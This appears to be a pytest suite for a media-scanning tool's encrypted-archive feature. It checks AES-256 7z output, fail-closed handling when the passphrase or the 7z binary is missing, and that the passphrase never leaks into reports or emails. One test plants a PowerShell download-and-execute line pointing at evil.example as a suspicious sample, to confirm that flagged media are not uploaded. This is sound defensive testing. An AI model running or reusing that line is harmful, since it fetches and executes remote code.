"""Tests for encrypted archives: the 0.3.0 privacy contract.

The tests use the real 7z binary when it is installed, because the whole point
of the feature is the file that a recipient downloads: it has to open with the
passphrase and be useless without it.  When 7z is missing the affected tests
skip; the fail-closed behaviour (no passphrase, no 7z) is tested without it.
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
from pathlib import Path
from typing import Any

import pytest

from dcs.core.archiver import Archiver, ArchiveResult, plan_source
from dcs.core.config import AppConfig, ArchiveConfig
from dcs.core.events import CollectingSink, Stage, StageState, Verdict
from dcs.core.notify.templates import render_email_html, render_email_text
from dcs.core.pipeline import JobRequest, Pipeline
from dcs.core.report import render_html, render_text
from dcs.core.upload.base import UploadResult

HAS_7Z = shutil.which("7z") is not None
requires_7z = pytest.mark.skipif(not HAS_7Z, reason="the 7z binary is not installed")


@pytest.fixture
def archive_config() -> ArchiveConfig:
    """ArchiveConfig that compresses as fast as possible, to keep tests quick."""
    config = ArchiveConfig()
    config.compression_level = 1
    return config

PASSPHRASE = "correct horse battery staple"
FAKE_LINK = "https://example.test/f/encrypted"


# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------


def make_tree(root: Path, files: dict[str, bytes]) -> Path:
    for name, payload in files.items():
        path = root / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(payload)
    return root


def create_encrypted(
    config: ArchiveConfig,
    root: Path,
    dest: Path,
    *,
    passphrase: str = PASSPHRASE,
    name: str = "DCS_test.zip",
) -> ArchiveResult:
    total_files, total_bytes, sizes = plan_source(str(root))
    return Archiver(config).create(
        str(root),
        str(dest),
        name=name,
        total_files=total_files,
        total_bytes=total_bytes,
        size_map=sizes,
        passphrase=passphrase,
    )


class FakeProvider:
    """Local stand-in for a cloud host: records the uploads, publishes nothing."""

    provider_id = "fake"
    label = "Fake Host"
    requires_key = False
    max_bytes = 0

    def __init__(self) -> None:
        self.calls: list[dict[str, Any]] = []

    def availability(self) -> tuple[bool, str]:
        return True, ""

    def upload(
        self,
        path: str,
        *,
        progress: Any = None,
        cancel: Any = None,
        part_label: str = "",
    ) -> UploadResult:
        size = os.path.getsize(path)
        self.calls.append({"path": path, "size": size})
        return UploadResult(ok=True, link=FAKE_LINK, provider=self.provider_id, path=path, size=size)

    def folder_link(self) -> str:
        return ""


@pytest.fixture
def fake_provider(monkeypatch: pytest.MonkeyPatch) -> FakeProvider:
    provider = FakeProvider()
    monkeypatch.setattr("dcs.core.pipeline.build_provider", lambda *args, **kwargs: provider)
    return provider


def run_job(config: AppConfig, source: Path, **overrides: Any) -> tuple[Any, CollectingSink]:
    sink = CollectingSink()
    request = JobRequest(
        source_path=str(source),
        label="testusb",
        email_dry_run=True,
        recipients=[],
        **overrides,
    )
    return Pipeline(config).run(request, sink=sink), sink


def seven_zip(*args: str, stdin: bytes | None = None) -> subprocess.CompletedProcess[bytes]:
    return subprocess.run(
        ["7z", *args],
        input=stdin if stdin is not None else b"",
        capture_output=True,
        timeout=120,
        check=False,
    )


# ---------------------------------------------------------------------------
# the archive on disk
# ---------------------------------------------------------------------------


@requires_7z
def test_encrypted_archive_opens_with_the_passphrase_and_not_without(
    tmp_path: Path, archive_config: ArchiveConfig
) -> None:
    archive_config.encrypt = True
    root = make_tree(tmp_path / "usb", {"readme.txt": b"holiday photos\n", "docs/b.bin": os.urandom(2048)})
    dest = tmp_path / "images"

    result = create_encrypted(archive_config, root, dest)

    assert result.ok is True, result.error
    assert result.encrypted is True
    assert result.encryption == "AES-256"
    assert result.headers_encrypted is True
    assert result.primary_path.endswith(".7z")
    assert result.parts and os.path.exists(result.primary_path)

    # without the passphrase the archive cannot even be listed: the file names
    # are part of what this feature protects
    listing = seven_zip("l", result.primary_path)
    assert listing.returncode != 0

    # with the passphrase the content comes back byte for byte
    out = tmp_path / "extracted"
    extracted = seven_zip("x", f"-p{PASSPHRASE}", f"-o{out}", "-y", result.primary_path)
    assert extracted.returncode == 0, extracted.stdout.decode("utf-8", "replace")
    assert (out / "readme.txt").read_bytes() == b"holiday photos\n"
    assert (out / "docs" / "b.bin").read_bytes() == (root / "docs" / "b.bin").read_bytes()

    # the passphrase is not in the argv that DCS ran, where /proc would show it
    assert PASSPHRASE not in " ".join(result.command)


@requires_7z
def test_the_probe_tells_an_encrypted_archive_from_a_plain_one(
    tmp_path: Path, archive_config: ArchiveConfig
) -> None:
    """The verification step must not accept a readable archive as encrypted."""
    root = make_tree(tmp_path / "usb", {"a.txt": b"a"})
    dest = tmp_path / "images"
    tool = shutil.which("7z") or ""
    archiver = Archiver(archive_config)

    plain_config = ArchiveConfig()
    plain_config.format = "7z"
    plain_config.compression_level = 1
    plain = Archiver(plain_config).create(
        str(root), str(dest / "plain"), name="plain.7z", total_files=1, total_bytes=1
    )
    assert plain.ok is True, plain.error
    encrypted, _detail = archiver._probe_encryption(tool, plain.primary_path)
    assert encrypted is False, "a plain archive must not be reported as encrypted"

    archive_config.encrypt = True
    secret = create_encrypted(archive_config, root, dest / "secret")
    assert secret.ok is True, secret.error
    encrypted, detail = archiver._probe_encryption(tool, secret.primary_path)
    assert encrypted is True
    assert detail == ""  # the strongest case: the file names need the password too


@requires_7z
def test_encryption_turns_a_zip_request_into_a_7z_archive(
    tmp_path: Path, archive_config: ArchiveConfig
) -> None:
    archive_config.encrypt = True
    archive_config.format = "zip"
    root = make_tree(tmp_path / "usb", {"a.txt": b"a"})
    dest = tmp_path / "images"

    result = create_encrypted(archive_config, root, dest)

    assert result.ok is True, result.error
    assert result.tool == "7z"
    assert result.primary_path.endswith(".7z")
    assert any("7z" in warning for warning in result.warnings)


@requires_7z
def test_encryption_keeps_working_with_split_volumes(
    tmp_path: Path, archive_config: ArchiveConfig
) -> None:
    archive_config.encrypt = True
    archive_config.split_size_mb = 1
    root = make_tree(tmp_path / "usb", {"big.bin": os.urandom(3 * 1024 * 1024)})
    dest = tmp_path / "images"

    result = create_encrypted(archive_config, root, dest, name="DCS_split.7z")

    assert result.ok is True, result.error
    assert result.split is True
    assert all(part.path[:-3].endswith(".7z.") for part in result.parts)


# ---------------------------------------------------------------------------
# failing closed
# ---------------------------------------------------------------------------


def test_missing_passphrase_fails_closed_and_produces_no_file(
    tmp_path: Path, archive_config: ArchiveConfig
) -> None:
    archive_config.encrypt = True
    root = make_tree(tmp_path / "usb", {"a.txt": b"a"})
    dest = tmp_path / "images"

    sink = CollectingSink()
    total_files, total_bytes, sizes = plan_source(str(root))
    result = Archiver(archive_config).create(
        str(root),
        str(dest),
        name="DCS_test.zip",
        sink=sink,
        total_files=total_files,
        total_bytes=total_bytes,
        size_map=sizes,
        passphrase="",
    )

    assert result.ok is False
    assert result.encrypted is False
    assert "passphrase" in result.error
    assert not list(dest.glob("*"))
    assert (Stage.ARCHIVE, StageState.FAILED) in [
        (stage, state) for stage, state, _ in sink.stages
    ]


def test_missing_7z_fails_closed_instead_of_writing_a_readable_archive(
    tmp_path: Path, archive_config: ArchiveConfig, monkeypatch: pytest.MonkeyPatch
) -> None:
    archive_config.encrypt = True
    root = make_tree(tmp_path / "usb", {"a.txt": b"a"})
    dest = tmp_path / "images"

    real_which = shutil.which
    monkeypatch.setattr(
        "dcs.core.archiver.shutil.which",
        lambda name, *args, **kwargs: None if name in ("7z", "7za") else real_which(name, *args, **kwargs),
    )

    result = create_encrypted(archive_config, root, dest)

    assert result.ok is False
    assert "7z" in result.error
    assert not list(dest.glob("*"))


def test_a_passphrase_with_a_line_break_is_refused(
    tmp_path: Path, archive_config: ArchiveConfig
) -> None:
    archive_config.encrypt = True
    root = make_tree(tmp_path / "usb", {"a.txt": b"a"})
    dest = tmp_path / "images"

    result = create_encrypted(archive_config, root, dest, passphrase="two\nlines")

    assert result.ok is False
    assert "line break" in result.error
    assert not list(dest.glob("*"))


# ---------------------------------------------------------------------------
# passphrase sources
# ---------------------------------------------------------------------------


def test_passphrase_sources_prefer_this_run_then_the_environment(monkeypatch: pytest.MonkeyPatch) -> None:
    config = AppConfig()
    monkeypatch.setenv("DCS_PW_FOR_TEST", "from-env")
    config.archive.passphrase_env = "DCS_PW_FOR_TEST"

    assert config.archive_passphrase("") == "from-env"
    assert config.archive_passphrase("explicit-wins") == "explicit-wins"

    monkeypatch.delenv("DCS_PW_FOR_TEST")
    assert config.archive_passphrase("") == ""


# ---------------------------------------------------------------------------
# the pipeline, the report and the email
# ---------------------------------------------------------------------------


@requires_7z
def test_pipeline_records_encryption_and_never_the_passphrase(
    tmp_config: AppConfig,
    clean_tree: Path,
    fake_provider: FakeProvider,
) -> None:
    tmp_config.upload.enabled = True
    tmp_config.archive.encrypt = True
    tmp_config.report.include_file_list = True

    result, sink = run_job(tmp_config, clean_tree, passphrase=PASSPHRASE)

    assert result.archive is not None and result.archive.ok, result.upload_skipped_reason
    assert result.archive.encrypted is True
    assert result.archive.encryption == "AES-256"
    assert result.share_link == FAKE_LINK
    # the host did receive a file that cannot be opened without the passphrase
    uploaded = fake_provider.calls[-1]["path"]
    assert uploaded.endswith(".7z")
    assert seven_zip("l", uploaded).returncode != 0

    # the secret must not appear in any artefact a user can share
    summary = json.dumps(result.to_dict(), ensure_ascii=False)
    assert PASSPHRASE not in summary
    assert "AES-256" in summary
    for kind, path in result.report_paths.items():
        text = Path(path).read_text(encoding="utf-8")
        assert PASSPHRASE not in text, f"the passphrase leaked into the {kind} report"

    html = render_html(result, tmp_config.report)
    text_report = render_text(result, tmp_config.report)
    assert "AES-256" in html and "AES-256" in text_report
    assert "passphrase" in text_report.lower()
    assert PASSPHRASE not in html and PASSPHRASE not in text_report

    email_html = render_email_html(result)
    email_text = render_email_text(result)
    assert "encrypted" in email_html.lower() or "AES-256" in email_html
    assert "AES-256" in email_text
    assert PASSPHRASE not in email_html and PASSPHRASE not in email_text

    assert any("encrypted" in message for stage, state, message in sink.stages if stage is Stage.ARCHIVE and state is StageState.DONE)


@requires_7z
def test_encryption_does_not_unlock_a_suspicious_upload(
    tmp_config: AppConfig,
    clean_tree: Path,
    fake_provider: FakeProvider,
) -> None:
    """Encryption is a privacy measure, not a permission slip for malware."""
    # a suspicious file on an otherwise small tree: the verdict is not clean,
    # and upload.upload_when = "always" would allow publishing it - but only
    # with an explicit --yes, which encryption must not provide.
    target = clean_tree / "notes.ps1"
    target.write_text("IEX (New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')\n")

    tmp_config.upload.enabled = True
    tmp_config.upload.upload_when = "always"
    tmp_config.archive.when = "always"
    tmp_config.archive.encrypt = True

    result, _sink = run_job(tmp_config, clean_tree, passphrase=PASSPHRASE)

    assert result.verdict is not Verdict.CLEAN
    assert result.uploads == []
    assert fake_provider.calls == []
    assert "confirm" in result.upload_skipped_reason.lower()


@requires_7z
def test_infected_medium_is_never_archived_even_when_encrypted(
    tmp_config: AppConfig,
    sample_tree: Path,
    fake_provider: FakeProvider,
) -> None:
    # archive.when stays at its default ("clean"): an infected medium must not
    # be archived at all, encrypted or not
    tmp_config.upload.enabled = True
    tmp_config.archive.encrypt = True

    result, _sink = run_job(tmp_config, sample_tree, passphrase=PASSPHRASE)

    assert result.archive is None or not result.archive.ok
    assert result.uploads == []
    assert result.share_link == ""
    states = {timing.stage: timing.state for timing in result.timings}
    assert states["archive"] == "skipped"


@requires_7z
def test_pipeline_without_a_passphrase_fails_the_archive_stage(
    tmp_config: AppConfig,
    clean_tree: Path,
    fake_provider: FakeProvider,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.delenv("DCS_ARCHIVE_PASSPHRASE", raising=False)
    tmp_config.upload.enabled = True
    tmp_config.archive.encrypt = True

    result, _sink = run_job(tmp_config, clean_tree)

    assert result.archive is None
    assert result.uploads == []
    assert "passphrase" in result.upload_skipped_reason
    states = {timing.stage: timing.state for timing in result.timings}
    assert states["archive"] == "failed"


# ---------------------------------------------------------------------------
# the command line
# ---------------------------------------------------------------------------


def test_cli_encrypt_without_a_passphrase_fails_clearly(
    tmp_path: Path, clean_tree: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    from dcs.cli import main

    monkeypatch.delenv("DCS_ARCHIVE_PASSPHRASE", raising=False)
    config_path = tmp_path / "config.toml"
    code = main(
        [
            "--config",
            str(config_path),
            "run",
            "--path",
            str(clean_tree),
            "--encrypt",
            "--no-upload",
            "--no-email",
            "--no-history",
            "--quiet",
        ]
    )

    assert code == 2
    captured = capsys.readouterr()
    assert "passphrase" in (captured.out + captured.err).lower()


@requires_7z
def test_cli_encrypt_uses_the_environment_variable(
    tmp_path: Path,
    clean_tree: Path,
    fake_provider: FakeProvider,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    from dcs.cli import main

    monkeypatch.setenv("DCS_ARCHIVE_PASSPHRASE", PASSPHRASE)
    config_path = tmp_path / "config.toml"
    config_path.write_text(
        '\n'.join(
            [
                "[general]",
                f'output_dir = "{tmp_path / "out"}"',
                "[report]",
                f'directory = "{tmp_path / "reports"}"',
                "[upload]",
                "enabled = false",
                "[email]",
                "enabled = false",
                "[scan]",
                'engines = ["heuristic"]',
            ]
        ),
        encoding="utf-8",
    )

    code = main(
        [
            "--config",
            str(config_path),
            "run",
            "--path",
            str(clean_tree),
            "--encrypt",
            "--no-upload",
            "--no-email",
            "--no-history",
            "--quiet",
        ]
    )

    captured = capsys.readouterr()
    assert code == 0, captured.out + captured.err
    assert "encrypted (AES-256)" in captured.out
    assert PASSPHRASE not in captured.out + captured.err


@requires_7z
def test_unencrypted_archive_says_so_in_the_report(
    tmp_config: AppConfig, clean_tree: Path, fake_provider: FakeProvider
) -> None:
    result, _sink = run_job(tmp_config, clean_tree)

    assert result.archive is not None and result.archive.ok
    assert result.archive.encrypted is False
    html = render_html(result, tmp_config.report)
    assert "anyone with the archive can read it" in html
    assert "none - anyone with the file can read it" in render_text(result, tmp_config.report)
